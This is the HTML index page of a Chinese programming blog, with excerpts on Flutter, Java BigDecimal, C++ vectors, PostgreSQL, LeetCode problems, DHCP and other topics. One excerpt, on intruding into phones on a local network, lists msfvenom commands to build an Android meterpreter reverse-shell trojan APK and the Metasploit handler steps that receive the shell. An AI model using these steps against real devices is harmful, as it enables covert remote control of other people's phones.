<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.122.0">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程鬼谷子的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程鬼谷子的博客">
		<meta property="og:title" content="编程鬼谷子的博客" />
<meta property="og:description" content="编程鬼谷子的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcguiguzi.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程鬼谷子的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程鬼谷子的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程鬼谷子的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4c85447adf10cd79b210d42f4b20e1c/" rel="bookmark">
			flutter 创建带输入框的Cupertino风格的弹窗
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		showCupertinoDialog( context: context, builder: (context) { return CupertinoAlertDialog( title: Text('温馨提示'), content: Card( elevation: 0.0, child: Column( children: &lt;Widget&gt;[ Text('this is a message'), TextField( decoration: InputDecoration( hintText: 'input wahatever you want', filled: true, fillColor: Colors.grey.shade50), ), ], ), ), actions: &lt;Widget&gt;[ CupertinoDialogAction( onPressed: () { Navigator.pop(context); }, child: Text('取消'), ), CupertinoDialogAction( onPressed: () { Navigator.pop(context); }, child: Text('确定'), ), ], ); }); TextField 也可以换成CupertinoTextField
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99566710f59fcde933ded96deb6656b6/" rel="bookmark">
			java 中 BigDecimal 详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先，学习一个东西，我们都必须要带着问题去学，这边我分为 【为什么？】【是什么？】【怎么用？】
【为什么要用BigDecimal？】
首先，我们先看一下，下面这个现象
那为什么会出现这种情况呢？
因为不论是float 还是double都是浮点数，而计算机是二进制的，浮点数会失去一定的精确度。
注:根本原因是:十进制值通常没有完全相同的二进制表示形式;十进制数的二进制表示形式可能不精确。只能无限接近于那个值
但是，在项目中，我们不可能让这种情况出现，特别是金融项目，因为涉及金额的计算都必须十分精确，你想想，如果你的支付宝账户余额显示193.99999999999998，那是一种怎么样的体验？
【BigDecimal是什么？】
1、简介
Java在java.math包中提供的API类BigDecimal，用来对超过16位有效位的数进行精确的运算。双精度浮点型变量double可以处理16位有效数。在实际应用中，需要对更大或者更小的数进行运算和处理。float和double只能用来做科学计算或者是工程计算，在商业计算中要用java.math.BigDecimal。BigDecimal所创建的是对象，我们不能使用传统的+、-、*、/等算术运算符直接对其对象进行数学运算，而必须调用其相对应的方法。方法中的参数也必须是BigDecimal的对象。构造器是类的特殊方法，专门用来创建对象，特别是带有参数的对象。
2、构造器描述 BigDecimal(int) 创建一个具有参数所指定整数值的对象。 BigDecimal(double) 创建一个具有参数所指定双精度值的对象。 //不推荐使用
BigDecimal(long) 创建一个具有参数所指定长整数值的对象。 BigDecimal(String) 创建一个具有参数所指定以字符串表示的数值的对象。//推荐使用
3、方法描述 add(BigDecimal) BigDecimal对象中的值相加，然后返回这个对象。 subtract(BigDecimal) BigDecimal对象中的值相减，然后返回这个对象。 multiply(BigDecimal) BigDecimal对象中的值相乘，然后返回这个对象。 divide(BigDecimal) BigDecimal对象中的值相除，然后返回这个对象。 toString() 将BigDecimal对象的数值转换成字符串。 doubleValue() 将BigDecimal对象中的值以双精度数返回。 floatValue() 将BigDecimal对象中的值以单精度数返回。 longValue() 将BigDecimal对象中的值以长整数返回。 intValue() 将BigDecimal对象中的值以整数返回。
特别说明一下，为什么BigDecimal(double) 不推荐使用，
看上面代码运行结果，你就应该知道为什么不推荐使用了，因为用这种方式也会导致计算有问题，
为什么会出现这种情况呢？
JDK的描述：1、参数类型为double的构造方法的结果有一定的不可预知性。有人可能认为在Java中写入newBigDecimal(0.1)所创建的BigDecimal正好等于 0.1（非标度值 1，其标度为 1），但是它实际上等于0.1000000000000000055511151231257827021181583404541015625。这是因为0.1无法准确地表示为 double（或者说对于该情况，不能表示为任何有限长度的二进制小数）。这样，传入到构造方法的值不会正好等于 0.1（虽然表面上等于该值）。
2、另一方面，String 构造方法是完全可预知的：写入 newBigDecimal("0.1") 将创建一个 BigDecimal，它正好等于预期的 0.1。因此，比较而言，通常建议优先使用String构造方法
当double必须用作BigDecimal的源时，请使用Double.toString(double)转成String，然后使用String构造方法，或使用BigDecimal的静态方法valueOf，如下
【怎么用？】
这边我就不多说什么了，直接上代码，都挺简单的，最基本的加减乘除，应该能看的懂
这边特别提一下，如果进行除法运算的时候，结果不能整除，有余数，这个时候会报java.lang.ArithmeticException: ，这边我们要避免这个错误产生，在进行除法运算的时候，针对可能出现的小数产生的计算，必须要多传两个参数
divide(BigDecimal，保留小数点后几位小数，舍入模式)
舍入模式
ROUND_CEILING //向正无穷方向舍入 ROUND_DOWN //向零方向舍入 ROUND_FLOOR //向负无穷方向舍入 ROUND_HALF_DOWN //向（距离）最近的一边舍入，除非两边（的距离）是相等,如果是这样，向下舍入, 例如1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99566710f59fcde933ded96deb6656b6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e839f7fbe6c8e4c0d04775f969a5e861/" rel="bookmark">
			“vector” 中的 “iterator”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vector and Iterator 向量vector是C++标准模板库中的内容。vector是一个容器，他能够存放各种类型的对象，简单地说，vector是一个能够存放任意类型的动态数组，可以动态改变大小，使用向量时需要在程序中添加&lt; vector&gt;头文件
所有的标准库容器类都定义了相应的iterator容器，如vector， vector::iterator iter; 这句语句定义了一个名为iter的变量，它的数据类型是由 vector&lt; int&gt;定义的iterator类型，使用迭代器（iterator)程序员可以检查容器内元素，并实现元素的遍历
Vector的相关操作 初始化：
vector&lt;int&gt; a(10); //定义了10个整型元素的向量 vector&lt;int&gt; a(10,1); //定义了10个整型元素的向量,且给出每个元素的初值为1 int b[7]={1,2,3,4,5,9,8}; vector&lt;int&gt; a(b,b+7); //从数组中获得初值 其它：
（1）a.assign(b.begin(), b.begin()+3); //b为向量，将b的0~2个元素构成的向量赋给a （2）a.assign(4,2); //a只含4个元素，且每个元素为2 （3）a.back(); //返回a的最后一个元素 （4）a.front(); //返回a的第一个元素 （5）a[i]; //返回a的第i个元素，当且仅当a[i]存在 （6）a.clear(); //清空a中的元素 （7）a.empty(); //判断a是否为空，空则返回ture,不空则返回false （8）a.pop_back(); //删除a向量的最后一个元素 （9）a.erase(a.begin()+1,a.begin()+3); //删除a中第1个（从第0个算起）到第2个元素 （10）a.push_back(5); //在a的最后一个向量后插入一个元素，其值为5 （11）a.insert(a.begin()+1,5); //在a的第1个元素（从第0个算起）的位置插入数值5，如a为1,2,3,4，插入元素后为1,5,2,3,4 （12）a.insert(a.begin()+1,3,5); //在a的第1个元素（从第0个算起）的位置插入3个数，其值都为5 （13）a.insert(a.begin()+1,b+3,b+6); //b为数组，在a的第1个元素（从第0个算起）的位置插入b的第3个元素到第5个元素 （14）a.size(); //返回a中元素的个数； （15）a.capacity(); //返回a在内存中总共可以容纳的元素个数 （16）a.resize(10); //将a的现有元素个数调至10个，多则删，少则补，其值随机 （17）a.resize(10,2); //将a的现有元素个数调至10个，多则删，少则补，其值为2 （18）a.reserve(100); //将a的容量（capacity）扩充至100 （19）a.swap(b); //b为向量，将a中的元素和b中的元素进行整体性交换 （20）a==b; //b为向量，向量的比较操作还有!=,&gt;=,&lt;=,&gt;,&lt; 举例子：遍历 #include &lt;iostream&gt; #include &lt;vector&gt; using namespace std; int main() { vector&lt;int&gt; ss(4, 3); //容器中有4个元素，值都为3 vector&lt;int&gt;::iterator iter; for (iter = ss.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e839f7fbe6c8e4c0d04775f969a5e861/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b016c7cd88ba3f93cac10cc8ce50acf8/" rel="bookmark">
			Visual Studio注释代码段快捷键，附修改快捷键办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		默认注释快捷组合键 注释：
Ctrl+K → 选定需要注释的代码段 →Ctrl+C
取消注释：
Ctrl+K → 选定需要取消注释的代码段 →Ctrl+U
修改快捷键 打开Visual Studio选择“工具”中的“选项”
选择“环境”中的“键盘”，在“显示命令包含©:”下的文本框输入你想要修改的快捷键的关键字，这里以“注释”为例，选定“编辑,注释选定内容”，然后按下你需要设定的快捷键，这里我按的是“Ctrl+/”，接着点击“分配”，最后“确定”。这样设置完成后就可以用“Ctrl+/”进行代码注释操作啦。
其他快捷键的修改也可以参考这个修改方法。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba56fa6e789442250e1b07254170ae0c/" rel="bookmark">
			hbase批量入库遇到的坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		详细请参考链接内容：https://blog.csdn.net/weixin_40861707/article/details/79105753
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d850a4365c9234d631420874d0b18dde/" rel="bookmark">
			【LeetCode】给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目：
给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标。
你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。
示例：
给定 nums = [2, 7, 11, 15], target = 9 因为 nums[0] + nums[1] = 2 + 7 = 9 所以返回 [0, 1] 这是两数之和的问题，看似很简单，读者可以先思考下如何实现。本文介绍三种实现方式，并且分析复杂度。
1. 暴力法
遍历每个元素 xx，并查找是否存在一个值与 target - xtarget−x 相等的目标元素。代码示例如下：
public int[] twoSum(int[] nums, int target) { int[] result = new int[2]; for(int i = 0; i &lt; nums.length; i++) { for(int j = i + 1; j &lt; nums.length; j++) { if(nums[i] + nums[j] == target) { result[0] = i; result[1] = j; return result; } } } return result; } 算法复杂度分析：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d850a4365c9234d631420874d0b18dde/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31ff864e13caef3bd9a755986504748a/" rel="bookmark">
			ArcEngine 读取大数据量的IFeatureClass或ITable分页进行显示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 ArcEngine已经实现打开属性表功能，但是如果记录达到上万条的话，就非常慢，影响用户体验。
IQueryFilterDefinition3接口可以一次查询几百条数据，然后下次可以接着往下获取记录。 参考代码：IQueryFilterDefinition3 queryFilterDef = (IQueryFilterDefinition3)queryFilter; int count = FeatureLayer.FeatureClass.FeatureCount(queryFilter); int offset; int rowcount; queryFilterDef.PostfixClause = "order by OBJECTID asc"; //排序 queryFilterDef.SetPaginationClause(0, 200); 然后下次第一个参数设置201，以此类推。可以将此数值参数化 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e82becbbb74ada3e18cf7759201c306/" rel="bookmark">
			usleep() 函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		查看更多
https://www.yuque.com/docs/share/24e68431-0952-4349-87f1-454a3fc61a18
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f6a7ba189355eb7781afe9bd41f8e17/" rel="bookmark">
			PostgreSQL的登录、创建用户、数据库并赋权
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Table of Contents
一、在默认配置条件下，本机访问PostgreSQL
二、创建新用户来访问PostgreSQL
1、如上所述，先切换到Linux用户postgres，并执行psql：
2、创建数据库新用户，如 test：
3、创建用户数据库，如testdb：
4、将testdb数据库的所有权限都赋予test：
5、使用命令 \q 退出psql：
6、创建Linux普通用户，与刚才新建的数据库用户同名，如 test：
7、以test的身份连接数据库testdb：
三、最简单的做法
四、开启远程访问
1、编辑配置文件
2、重启数据库服务：
3、此后即可从其它机器上登录，例如用Navicat for PostgreSQL：
一、在默认配置条件下，本机访问PostgreSQL 切换到Linux用户postgres，然后执行psql：
$ sudo su - postgres [sudo] password for rongtao: postgres@rongtao:~$ psql psql (10.6 (Ubuntu 10.6-0ubuntu0.18.04.1)) Type "help" for help. postgres=# 此时就在数据库postgres中了。使用 psql -d [databasename] 可登录其他数据库。注意：执行psql命令时，必须确认已配置postgresql的环境变量。
二、创建新用户来访问PostgreSQL 1、如上所述，先切换到Linux用户postgres，并执行psql： $ sudo su - postgres [sudo] password for rongtao: postgres@rongtao:~$ psql psql (10.6 (Ubuntu 10.6-0ubuntu0.18.04.1)) Type "help" for help.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3f6a7ba189355eb7781afe9bd41f8e17/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a119b7e767889189ab273395456c1beb/" rel="bookmark">
			夜间灯光数据的ARCGIS操作处理笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考曾冰老师的公众号文章，使用ARCGIS操作处理制作夜间灯光数据。
夜间灯光影像下载自https://ngdc.noaa.gov/eog/dmsp/downloadV4composites.html——2013年。
步骤：
裁剪：按掩模提取投影：栅格投影——（asia_lambert_conformal_conic）——该投影比较适合中国地图地形 夜间灯光数据计算：以表格显示分区统计——mean（灯光密度）、sum（总强度） 将分区统计结果连接至矢量图层 对平均灯光值进行分级色彩统计。 通过平均灯光值可以看到整体经济发展情况。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0dc1ffef417b8dfea6c1879366edcafe/" rel="bookmark">
			利用Kali入侵局域网的手机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 生成木马病毒（将生成的apk文件拷贝到手机） msfvenom -p android/meterpreter/reverse_tcp LHOST=*.*.*.*(本地IP) LPORT=*(本地端口) -o *(输出目录) 启动postgresql数据库 service postgresql start 启动msfconsole msfconsole 使用探测句柄 use exploit/multi/handler 设置payload set payload android/meterpreter/reverse_tcp 设置本地IP set LHOST=*.*.*.* 设置本地端口 set LPORT=* 进行探测 exploit 查看可执行的命令 help 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db3f3038748bb7954ca5ff4a9e902845/" rel="bookmark">
			JSON字符串转List集合操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景:
JSON字符串转List集合与List集合转JSON字符串
使用的jar包是fastjson-1.2.41.jar 1.JSON字符串转List集合操作
public static &lt;T&gt; List&lt;T&gt; parseArray(String text, Class&lt;T&gt; clazz) { try { return JSON.parseArray(text, clazz); } catch (Exception e) { } return Collections.emptyList(); } 2.List集合转JSON字符串操作
public static String toJSONString2(Object obj) { JSONArray jsonObj = (JSONArray) JSONArray.toJSON(obj); return jsonObj.toJSONString(); } 3.测试demo的main函数
public static void main(String []args){ System.out.println("测试开始"); //对象一 DemoModel model = new DemoModel(); model.setId(12345678); model.setType("01"); model.setZ(1111.2222); model.setZ1(3333.4444); model.setZ2(5555.6666); model.setZ3(7777.8888); //对象二 DemoModel model1 = new DemoModel(); model1.setId(87654321); model1.setType("02"); model1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/db3f3038748bb7954ca5ff4a9e902845/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b33d61188f067f89a9798ee194040b3d/" rel="bookmark">
			如何在腾讯云ubuntu服务器上将http协议转换成https协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 内容简历 随着物联网、安卓端、小程序等概念不断的深入人心，越来越多此类项目开始引入市场；本人近期便在处理微信小程序的问题，因为微信小程序的服务器域名必须是https协议，而我们一般部署在服务器Tomcat下是http协议，所以我们需要对Tomcat进行一些简单的配置，本文就是梳理自己在配置过程中遇见的问题以及如何解决该问题的
1. 下载SSL证书 点击腾讯云官网，点开“产品”下拉列表（左上方），找到SSL证书
点击“立即购买”
-点击“免费快速申请”
接下来按要求进行填写申请，提交申请
等证书申请验证通过后，再次回到证书详情页，刷新一下，发现信息更新了，在状态栏点击“下载”
下载后是一个压缩包，进行解压，有4个文件夹和1个csr文件
2.安装SSL证书 打开Tomcat文件夹，如果你填写证书时没有设置秘钥，则里面有两个文件，jks文件就是证书，还有个txt文件是系统生成的秘钥，反之，那么文件夹里没有txt这个文件(到时候用自己设置的秘钥)把.jks文件复制到你的云服务器上的Tomcat下的conf文件中（我是用WinSCP进行文件操作的）配置server.xml文件，需要修改三个地方(该文件在Tomcat目录下的conf文件夹里面) &lt;!-- 8080端口号修改成80，redirectPort修改成443，80是域名默认端口号，443端口是SSL的专用端口--&gt; &lt;Connector port="80" protocol="HTTP/1.1" connectionTimeout="20000" redirectPort="443" /&gt; &lt;!-- redirectPort修改成443--&gt; &lt;Connector port="8009" protocol="AJP/1.3" redirectPort="443" /&gt; &lt;!-- certificateKeystoreFile属性填写复制过去的那个jks文件的名字（记得带上jks后缀），加上certificateKeystorePassword这个属性，填写秘钥，记得把注释去掉--&gt; &lt;Connector port="443" protocol="org.apache.coyote.http11.Http11NioProtocol" maxThreads="150" SSLEnabled="true"&gt; &lt;SSLHostConfig&gt; &lt;Certificate certificateKeystoreFile="conf/www.xxxx.cn.jks" certificateKeystorePassword="xxxx" type="RSA" /&gt; &lt;/SSLHostConfig&gt; &lt;/Connector&gt; 在尝试在浏览器使用https://+域名来访问前，记得重启Tomcat 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59221d5be81eee421394d99f48143f82/" rel="bookmark">
			C#调试时异常
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为“e:\hasee\Documents\Visual Studio 2008\Projects\DataBase\_DataBase\_DataCtrl.cs”查找源。Checksum: MD5 {6d 6 6b 5e cb 3 39 b9 90 a0 e4 9e 6 ac f0 4f}
文件“e:\hasee\Documents\Visual Studio 2008\Projects\DataBase\_DataBase\_DataCtrl.cs”不存在。
正在脚本文档中查找“e:\hasee\Documents\Visual Studio 2008\Projects\DataBase\_DataBase\_DataCtrl.cs”...
正在“编辑并继续”目录“G:\Company\会议签到管理系统\enc_temp_folder\”中查看...
在“编辑并继续”目录中找不到具有匹配校验和的文件。
正在项目中查找“e:\hasee\Documents\Visual Studio 2008\Projects\DataBase\_DataBase\_DataCtrl.cs”。
在项目中未找到该文件。
正在目录“D:\Program Files (x86)\Microsoft Visual Studio 11.0\VC\crt\src\”中查看...
正在目录“D:\Program Files (x86)\Microsoft Visual Studio 11.0\VC\crt\src\vccorlib\”中查看...
正在目录“D:\Program Files (x86)\Microsoft Visual Studio 11.0\VC\atlmfc\src\mfc\”中查看...
正在目录“D:\Program Files (x86)\Microsoft Visual Studio 11.0\VC\atlmfc\src\atl\”中查看...
正在目录“D:\Program Files (x86)\Microsoft Visual Studio 11.0\VC\atlmfc\include”中查看...
搜索符号文件中嵌入的文档。
找不到嵌入文档。
活动解决方案的调试源文件设置指明调试器不会要求用户查找文件: e:\hasee\Documents\Visual Studio 2008\Projects\DataBase\_DataBase\_DataCtrl.cs。
调试器未能找到源文件“e:\hasee\Documents\Visual Studio 2008\Projects\DataBase\_DataBase\_DataCtrl.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/59221d5be81eee421394d99f48143f82/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c2f2472df9e07cb736b863d1c32c0d0/" rel="bookmark">
			剑指offer 连续子数组最大和
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目描述 HZ偶尔会拿些专业问题来忽悠那些非计算机专业的同学。今天测试组开完会后,他又发话了:在古老的一维模式识别中,常常需要计算连续子向量的最大和,当向量全为正数的时候,问题很好解决。但是,如果向量中包含负数,是否应该包含某个负数,并期望旁边的正数会弥补它呢？例如:{6,-3,-2,7,-15,1,2,2},连续子向量的最大和为8(从第0个开始,到第3个为止)。给一个数组，返回它的最大连续子序列的和，你会不会被他忽悠住？(子向量的长度至少是1) 该题目的大致思想如下：将数组从前到后加到result里，每次加之前先判断，如果result小于0，则说明后面的数字加在这个result上，还不如直接加在0上，因此result重新赋值为当前数字。如果不为零，则判断一下当前result和sums（可以初始化为很小的数字）那个大，如果result大，则将result赋值给sums即可，代码如下： class Solution { private: int result=0; int sums; public: int FindGreatestSumOfSubArray(vector&lt;int&gt; array) { result = sums = array[0]; for (int i = 1; i &lt;array.size(); i++) { if (result &lt; 0) result = array[i]; else result += array[i]; if (result &gt; sums) sums = result; } if (result &gt; sums) sums = result; return sums; } }; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8089abefbccb611f3b1f706eb4cc04f7/" rel="bookmark">
			linux基础&amp;DHCP是什么？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DHCP的全名叫什么？ (Dynamic Host configuration Protocol,动态主机配置协议 )
是一个局域网的网络协议，使用UDP协议工作；
主要有两个用途：（1）用于内部网或网络服务供应商自动分配IP地址；
（2）给用户用于内部网管理员作为对所有计算机作中央管理的手段。
功能简述：它主要是通过客户端发送广播数据包给整个物理网段内的所有主机，若局域网内有DHCP服务器时，才会响应客户端的IP参数要求。
1.成为一个DHCP的服务器的条件
（1）拥有真实物理网卡，或者连接广播域的真实物理网卡
（2）.该接口或者该物理网卡必须有一个合理的ip地址 此IP地址最好手动配置；
2.DHCP 协议中分为两个角色：
DHCP server服务端 和DHCP client客户端。
服务端：负责在所创建的地址池中向申请地址的客户端分发地址；服务端口号67
客户端：接收地址 服务端口号68
DHCP 基于UDP 发送所有的数据包，
在工作过程中依靠广播的形式发送报文信息，
与客户端实现交互，达到成功准确的分发地址。
DHCP工作过程中 重要的相关报文：
DHCP discover报文
DHCP offer 报文
可以发现 offer报文中
源MAC地址为 服务器的MAC地址；目标MAC地址为全F；
源ip地址为 服务器的iP地址；目标ip地址为255.255.255.255 255.255.255.255
源端口 为 67； 目标端口为68。
则可知 offer报文依旧是通过广播的形式发送，但是如果同时有多个客户端申请IP ，为何不出现错误？
因为在offer报文中 实际包含了客户端的MAC地址，则不会出现错误。
但由于 如果多个server存在，先接受到的地址 先生效，会出现DHCP欺骗攻击。
：在一个区域内 可能会有多个server服务器,有因为是DHCP基于UDP传输协议；缺少TCP的四种可靠机制；所以才会产生DHCP的request报文和DHCP ACK 报文。
DHCP request 报文
可以看出request 报文中：
源MAC为 客户端本地MAC地址；目标MAC地址为全F；
源ip地址为 0.0.0.0 0.0.0.0 ；目标ip地址为 255.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8089abefbccb611f3b1f706eb4cc04f7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ae1640bd5de7d6251945e0ed123eb31/" rel="bookmark">
			vuex中的state和mapState
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vuex是Vue中的数据仓库，用来存储数据的，Vue中每个组件都可以获取和修改vuex中的值。
1. 添加vuex插件
2.项目中会自动生成store.js文件
（1）state：陈述、声明。声明变量的
1）该值在组件中的使用：
（2）第二种写法：
组件中引入：import { mapState } from 'vuex'
store.js中的state的属性及值：
mapState是一个函数，它的返回值是一个对象，这个对象中每个属性都是函数，这个对象类似于computed的这种结构：
写法1）：传入数组，且三个参数一一对应，并且和state中的命名一样。
computed: mapState(['login', 'name', 'age']), &lt;p&gt;{{login}}{{name}}{{age}}&lt;/p&gt; 写法2）：传入对象，storeLogin为计算属性名，state为传入参数名（对应store中state），login为state中的login。
写法3）：计算属性computed不仅要接收mapState，而且自身也有计算属性，此时用“...”扩展运算符
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1643cfd53d7fdc1af062dd57577b0e3/" rel="bookmark">
			洛谷P1072 Hankson 的趣味题（题解）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://www.luogu.org/problemnew/show/P1072（题目传送）
数学的推理在编程的体现越来越明显了。（本人嘀咕）
首先，我们知道这两个等式： (a0,x)=a1,[b0,x]=b1(a0,x)=a1,[b0,x]=b1
于是，我们可以设： x=a1*p,b1=x*tx=a1∗p,b1=x∗t
于是有： a1*p*t=b1a1∗p∗t=b1
所以我们令： b1/a1=sb1/a1=s
则： p*t=sp∗t=s
即： t=s/pt=s/p
又由最大公约数与最小公倍数的定义与性质可得：
(a0/a1,p)=1,(b1/b0,t)=1(a0/a1,p)=1,(b1/b0,t)=1
所以我们令： a0/a1=m,b1/b0=na0/a1=m,b1/b0=n
则有： (p,m)=1,(s/p,n)=1(p,m)=1,(s/p,n)=1
这就是第一个结论，我们称其为结论一。事实上，我们其实已经可以由结论一整理出可以AC的方法，即用sqrt(s)的复杂度枚举s的因数，然后将每个因数放到结论一中，看看是否成立，再统计所有符合结论一的因数的个数，然后输出即可。这种算法的复杂度是：O(sqrt(s)*log(s)*n)。这样其实也能卡过数据，但是还是没有达到理论上的通过。所以我们还要继续优化。
我们考虑(s/p,n)=1。如果s/p与n有相同质因数，则无法使(s/p,n)=1成立。于是，为了使(s/p,n)=1成立，我们可以将s与n所有相同的质因数从s中去掉（不动s/p的原因是s/p是s的因变量，改变无意义），得到剩余的数l，若(s/p,n)=1成立，s/p就必须是l的约数。
我们继续考虑(p,m)=1。因为s/p是l的约数，那么p就一定可以表示为这样的形式：
p=(s/l)*r（因为s/p*r=p,r属于N*）
即：p一定是s/l的倍数（因为s/p是l的约数），r也是l的约数。于是就又有：
r|l,且(r,m)=1
这就是第二个结论，我们称其为结论二。而解决结论二的方法便很明显了。我们可以用与解决结论一相似的方法，将l与m所有相同的质因数从l中去掉，得到剩余的数q。那么所有使结论二成立的r都是q的因数了。然后，我们可以用sqrt(q)的复杂度枚举q的所有因数，输出q的因数个数就行了。这样，复杂度便降到了：O((sqrt(s)+log(s))*n)，从理论来说也不会超时了。
还有一点需要注意，那就是特判没有符合要求的x的情况。这种情况出现只有四种可能：
1、s不为整数 2、m不为整数 3、n不为整数 4、(s/l,m)≠1，即因为p是s/l的倍数，所以无论r取何值，都会有(p,m)≠1 加上这四个特判，这道题便做完了。（来个总结公式：结论成立=筛去必要条件的不足+必要条件，这也算是一种思路吧）
AC代码：
1 #include&lt;cstdio&gt; 2 #include&lt;iostream&gt; 3 #include&lt;cmath&gt; 4 #include&lt;algorithm&gt; 5 #include&lt;cstring&gt; 6 #include&lt;string&gt; 7 using namespace std; 8 int ssqrt; 9 int cf(int a,int b)//去掉a中与b共有的质因数。思想：将b质因数分解，同时将a中与b共有的质因数去掉。 10 { 11 ssqrt=sqrt(b); 12 for(int i=2;i&lt;=ssqrt;i++)//sqrt(b)复杂度质因数分解b 13 { 14 if(b%i==0)while(a%i==0)a/=i;//去掉a中与b共有的质因数，将a分解 15 while(b%i==0)b/=i;//将b质因数分解 16 } 17 if(b!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1643cfd53d7fdc1af062dd57577b0e3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24459b258535bc71ca00d07d25218c5a/" rel="bookmark">
			UUID的定义以及作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		UUID含义是通用唯一识别码 (Universally Unique Identifier)，这 是一个软件建构的标准，也是被开源软件基金会 (Open Software Foundation, OSF) 的组织应用在分布式计算环境 (Distributed Computing Environment, DCE) 领域的重要部分。
作用：
UUID 的目的是让分布式系统中的所有元素，都能有唯一的辨识资讯，而不需要透过中央控制端来做辨识资讯的指定。如此一来，每个人都可以建立不与其它人冲突的 UUID。在这样的情况下，就不需考虑数据库建立时的名称重复问题。目前最广泛应用的 UUID，即是微软的 Microsoft's Globally Unique Identifiers (GUIDs)，而其他重要的应用，则有 Linux ext2/ext3 档案系统、LUKS 加密分割区、GNOME、KDE、Mac OS X 等等。
组成：
